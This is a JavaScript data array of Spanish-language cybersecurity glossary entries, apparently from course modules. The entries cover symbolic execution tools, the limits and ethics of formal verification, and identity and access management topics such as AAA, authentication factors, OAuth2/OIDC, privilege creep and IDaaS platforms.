    detail: "**Symbolic execution:**\n→ Variables = símbolos (no valores concretos)\n→ Condiciones = constraints lógicos\n→ SMT solver: encuentra valores satisfaciendo constraints\n\n**Ejemplo:**\n```c\nint divide(int x, int y) {\n  return x / y;  // Qué valores hacen division by zero?\n}\n\n// Ejecución simbólica:\n// y = y_sym (símbolo)\n// return x_sym / y_sym\n// Constraint: y_sym ≠ 0 (para división válida)\n// SMT solver: \"Si y=0 → invalid\"\n```\n\n**Herramientas:**\n→ **KLEE:** para LLVM IR (C/C++)\n→ **Angr:** binario directly (no source requerido)\n→ **Triton:** dynamic symbolic execution\n\n**Aplicaciones:**\n→ Análisis de vulns (qué input causa crash?)\n→ Generación de test cases\n→ Finding exploitable conditions\n→ Verification (probar NO existe exploitable path)\n\n**Limitaciones:**\n✗ Path explosion (si muchas branches, exponencial estados)\n✗ Symbolic memory complejo (arrays, pointers)\n✗ External function calls (system calls, network) difícil modelar",
    examples: ["KLEE: find input causing null pointer deref in OpenSSL", "Angr: reverse-engineer binary input validation to bypass it"],
    related: ["Symbolic analysis", "Constraint solving", "SMT solvers"],
  },
  {
    id: 644,
    module: 61,
    term: "Límites y ethical implications",
    short: "Qué formal verification NO puede hacer. Dual-use, spec bugs.",
    detail: "**Alcance de formal verification:**\n\n✓ CAN verify:\n→ Lógica de algoritmo (no off-by-one errors)\n→ Propiedades de concurrency (no race conditions)\n→ Cryptographic math (AES correct implementation)\n\n✗ CANNOT verify:\n→ Side-channels (timing attacks bypass math proofs)\n→ Hardware implementation (fabricación errors)\n→ Human process (si spec wrong, prueba inútil)\n→ Operational security (who runs the code?)\n\n**Spec bugs:**\n```\nSpec: \"Users can only access their own files\"\nProof: \"Access control correctly implements spec\"\n→ Pero spec missing: admin backdoor!\n→ Code correct, security wrong.\n```\n\n**Ethical implications:**\n\n**Dual-use:**\n→ Formal methods verifican seguridad\n→ Pero también verifican malware correctness\n→ Ejemplo: APT usando formal methods para garantir backdoor no falla\n\n**Responsabilidad:**\n→ Publicar verified crypto → puede ayudar attackers cifrar datos (ransomware)\n→ Pero: openness permite peer review, detecta backdoors\n→ Balance: responsable disclosure\n\n**Acceso:**\n→ Formal tools costosos (Coq, TLA+ require training)\n→ Solo grandes orgs lo usan\n→ Brecha: software crítico open-source no verificado, proprietary sí\n\n**Futuro:**\n→ Formal methods + IA → automated proof generation\n→ Hacer verification accessible, no expert-only\n→ Obligatorio para critical infrastructure",
    examples: ["Verified crypto pero malware lo usa → ethical debate", "seL4 formally verified pero runs in hypervisor (layers no verified)"],
    related: ["Ethics in security", "Limitations", "Responsible disclosure"],
  },

  // ── M62 · Gestión de Identidades y Accesos (IAM) ────────────────────────────
  {
    id: 650,
    module: 62,
    term: "AAA (Authentication, Authorization, Accounting)",
    short: "3 pilares: quién eres, qué puedes hacer, qué hiciste.",
    detail: "**Authentication (Autenticación):**\n→ Probar identidad\n→ \"I am Alice\" — debe verificarse\n→ Métodos:\n   • Password (algo que sabés)\n   • Token TOTP (algo que tenés)\n   • Biometría (algo que sos)\n   • Certificate (criptografía)\n   • MFA (2+factores)\n\n**Authorization (Autorización):**\n→ Qué recursos puede acceder\n→ \"Alice puede leer proyecto X, pero no editar\"\n→ Basado en:\n   • Rol (RBAC) — \"developer\" puede deploy\n   • Atributo (ABAC) — \"IP corporativa\" puede acceder DB\n   • Recurso (RBAC granular) — por archivo\n\n**Accounting (Auditoría):**\n→ Registrar acciones\n→ \"Alice accedió DB a las 10:30, ejecutó query SELECT * FROM users\"\n→ Para:\n   • Forensica (qué pasó en breach)\n   • Compliance (mostrar audits)\n   • Detecci anomalías (login a las 3am, inusual)\n\n**Flujo típico:**\n```\n1. Alice login (password + TOTP) → Authentication OK\n2. Alice abre archivo → Sistema verifica: \"Alice en role 'analyst', archivo requiere 'analyst'\" → Autorized\n3. Alice modifica archivo → Log entry: \"user=alice, action=edit, resource=file.xlsx, timestamp=...\"\n```\n\n**Diferencia clave:**\n→ Authentication: Quién eres (verificar identidad)\n→ Authorization: Qué puedes hacer (acceso grants)\n→ Accounting: Qué hiciste (log trail)",
    examples: ["Login: auth (password ✓), authz (check groups), acct (log 'alice login' in audit)", "OAuth: authz server grants token (authorization), client uses token (authentication de sesion)"],
    related: ["Authentication", "Authorization", "Access control"],
  },
  {
    id: 651,
    module: 62,
    term: "Factores de autenticación",
    short: "5 factores: conocimiento, posesión, inherencia, ubicación, comportamiento.",
    detail: "**Los 5 factores de autenticación moderno:**\n\n**1️⃣ Conocimiento (Something you know)**\n→ Password, PIN, security questions\n→ Fácil de implementar\n→ Débil: phishable, reusable\n→ Ejemplo: password123\n\n**2️⃣ Posesión (Something you have)**\n→ Token hardware (YubiKey), smartphone TOTP, smart card\n→ Más fuerte: físicamente presente\n→ Débil: SIM swapping (attacker roba SIM → OTP por SMS)\n→ Ejemplo: FIDO2 key, Google Authenticator\n\n**3️⃣ Inherencia (Something you are)**\n→ Biometría: huella, cara, iris, voz\n→ Muy fuerte: no revocable, difícil de falsificar\n→ Débil: spoofing (foto de cara real → unlock)\n→ Ejemplo: Touch ID en iPhone, facial recognition\n\n**4️⃣ Ubicación (Somewhere you are)**\n→ IP corporativa, país, geofence\n→ Contextual: no factor fuerte solo\n→ Débil: VPN/proxy fácil de usar\n→ Ejemplo: \"Login desde Italia? Blocked.\"\n\n**5️⃣ Comportamiento (How you act)**\n→ Patrón de escritura, tiempo de keystroke, patrón click mouse\n→ Biométrico comportamental\n→ Débil: variable, aprendible\n→ Ejemplo: Typing pattern, device fingerprinting\n\n**MFA = Múltiples factores (distinto tipo):**\n```\n✓ REAL MFA:\n  ├─ Password (factor 1: conocimiento)\n  └─ TOTP token (factor 2: posesión)\n\n✗ FAKE MFA:\n  ├─ Password (factor 1)\n  └─ Security question (factor 1 — mismo tipo)\n```\n\n**Phishing-resistant MFA:**\n→ FIDO2/Passkeys: origin binding previene evilginx\n→ Biometría: attacker no tiene huella\n→ Ubicación: attacker en país diferente → blocked\n→ **SMS OTP NO phishing-resistant** (SIM swap, interception)\n\n**Recomendación moderna:**\n→ Passwordless (passkeys) > Password + FIDO2 > Password + SMS OTP > Password solo",
    examples: ["Real MFA: password + FIDO2 key → attacker puede tener password pero no key", "Fake MFA: password + password recovery question → attacker puede tener both"],
    related: ["MFA", "Passwordless", "Phishing resistance"],
  },
  {
    id: 652,
    module: 62,
    term: "OAuth2 / OIDC (Single Sign-On)",
    short: "Delegación de autenticación. Login con Google, Microsoft, etc.",
    detail: "**OAuth2 flujo:**\n→ No confundir con authentication (es autorización)\n→ Pero usado para SSO\n\n**Scenario:**\n```\nUser quiere login en \"myapp.com\" con Google\n\n1. myapp.com: \"Login with Google\"\n   → Redirige a accounts.google.com\n\n2. Google: User login + password\n   → Verifica identidad\n   → Google genera \"code\" temporal\n   → Redirige: myapp.com?code=xyz\n\n3. myapp.com backend:\n   → Intercambia code por access_token\n   → Token válido solo en myapp, no reutilizable\n   → Extrae email, nombre de Google\n   → Crea sesión local\n\n4. User logged in en myapp\n```\n\n**Ventajas:**\n✓ No almacenar passwords en cada app\n✓ Usuarios: 1 login (Google) → acceso múltiples apps\n✓ Seguridad: Google gestiona password, MFA\n✓ Revocación: user logout Google → todas las apps logged out\n\n**OIDC (OpenID Connect):**\n→ Layer sobre OAuth2 para Authentication\n→ Mismo flujo pero obtiene ID token (identidad verificada)\n→ VS OAuth2 puro: solo access token (\"puedes acceder recurso X\")\n\n**Riesgos OAuth2:**\n⚠️ Redirect URI mismatch: attacker redirige token a sí mismo\n⚠️ Code reuse: usar 'code' multiple veces\n⚠️ Token leakage: referer header expone token\n→ Solución: PKCE (Proof Key for Code Exchange)",
    examples: ["Login myapp.com: click 'Google' → Google MFA → back to myapp logged in", "Exploit: attacker redirects code to malicious site → steals access token → impersonates user"],
    related: ["SSO", "OAuth2", "OIDC"],
  },
  {
    id: 653,
    module: 62,
    term: "Privilege escalation (privilege creep)",
    short: "Usuarios acumulan permisos innecesarios. Revisión periódica.",
    detail: "**Problema:**\n→ Alice contratada como \"analyst\"\n→ Necesita acceso proyecto X\n→ Admin: grant analyst-x role\n→ 6 meses después: Alice promoted a \"manager\"\n→ Pero nadie revoke analyst-x role\n→ Ahora Alice tiene dos roles: manager + analyst-x\n→ Si manager no necesita analyst-x → privilege creep\n\n**Impacto:**\n→ Insider risk (Alice puede acceder más que necesario)\n→ Compliance violation (GDPR, HIPAA, PCI-DSS audits)\n→ Post-breach (attacker steals Alice's account → access a todos sus roles)\n\n**Mitigación:**\n\n**1. Least Privilege (PoLP) by design:**\n→ Grant mínimo necesario\n→ \"What's the minimum role to do the job?\"\n\n**2. Role recertification:**\n→ Cada 6-12 meses\n→ Manager: \"Revisa tu team's access rights\"\n→ Remover obsoletos\n```\nRecertification email:\nAlice: analyst-x (✓ needed, manager confirms)\nAlice: reporting-old (✗ old project, removed)\nBob: admin (?) ESCALATION: ask manager\n```\n\n**3. Automated tooling:**\n→ Enterprise IAM (Okta, Entra ID): audit trails\n→ Compare: actual permissions vs policy\n→ Flag violations automatically\n\n**4. SoD (Segregation of Duties):**\n→ No permitir conflictos de interés\n→ Ejemplo: \"analyst\" + \"approver\" no combo\n→ \"developer\" + \"deploy\" controlado",
    examples: ["Insider threat: Alice en HR + Finance → access salaries + bank accounts", "Microsoft admin compromise: attacker uses over-privileged admin account → enterprise compromise"],
    related: ["Least privilege", "Access review", "Compliance"],
  },
  {
    id: 654,
    module: 62,
    term: "Gestión de identidades (IDaaS)",
    short: "Platforms centralizadas: Okta, Entra ID, OneLogin. Sincronización.",
    detail: "**Identity as a Service (IDaaS):**\n→ Cloud-based central directory\n→ Almacena: usuarios, roles, credenciales, MFA\n→ Integra con: apps, infraestructura, cloud providers\n→ Ejemplos: Okta, Microsoft Entra ID, Ping, OneLogin\n\n**Ventajas sobre on-prem LDAP:**\n✓ No mantenimiento (vendor lo hace)\n✓ High availability (multi-region)\n✓ Integración SSO → múltiples apps\n✓ Audit trail centralizado\n✓ MFA enforcement\n✓ Conditional access (block unknown IP)\n\n**Ciclo de vida identidad:**\n```\nJoiner:\n├─ HR system: new employee\n├─ Sync a IDaaS: crear user\n├─ Sync a otros sistemas: email, VPN, GitHub\n└─ Assigned al team (grupos/roles)\n\nMover:\n├─ Departamento change\n├─ Roles actualizados\n├─ Permisos ajustados\n└─ Sync a todos los sistemas\n\nLeaver:\n├─ Terminate en HR\n├─ IDaaS: disable account\n├─ Sync: revocar acceso TODOS sistemas\n├─ Archive: 7 años si compliance require\n└─ Verificar: ex-employee no accede\n```\n\n**Componentes clave:**\n\n**Directory:**\n→ LDAP backend (Microsoft Active Directory, Okta Universal Directory)\n→ Attributes: email, groups, manager, department\n\n**Provisioning/Deprovisioning:**\n→ Auto-sync: HR system → Identity platform\n→ Broadcast: Identity platform → apps/cloud\n→ Real-time o scheduled\n\n**SSO:**\n→ SAML / OIDC protocols\n→ Login once → access many apps\n\n**MFA Management:**\n→ TOTP, FIDO2, SMS (deprecated)\n→ Backup codes\n→ Device enrollment\n\n**Conditional Access:**\n→ Policy: \"Si login IP nueva + late night → require step-up auth\"\n→ Risk-based: behavioral analytics\n→ Geo-blocking, device compliance check",
    examples: ["Okta provision: employee joins → auto-create Slack, GitHub, Salesforce accounts", "Entra ID deprovisioning: employee leaves → 30 min later all access revoked across O365, Azure, SaaS"],
    related: ["Identity management", "IAM platforms", "SSO"],
  },
];
